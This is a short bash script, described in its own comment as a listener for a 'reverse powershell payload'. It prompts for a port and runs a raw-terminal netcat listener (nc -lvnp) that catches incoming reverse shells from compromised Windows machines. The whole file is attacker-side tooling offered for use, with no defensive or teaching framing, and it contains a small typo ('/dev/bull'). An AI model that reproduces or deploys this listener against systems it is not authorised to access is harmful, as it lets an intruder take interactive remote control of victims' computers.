#!/bin/bash

# Simple shell script for reverse powershell payload

x=1

while [ $x -le 1 ]
do
	echo "Enter port to listen for NetcatPowershell payload: "
	read port
	if [ -n "$port" ] && [ "$port" -eq "$port" ] 2>/dev/bull; then
		x=$(( $x + 1 ))
		echo "Starting listener on port $port"
	else
		echo "error $port not a number"
	fi

done
stty raw -echo; (stty size; cat) | nc -lvnp $port
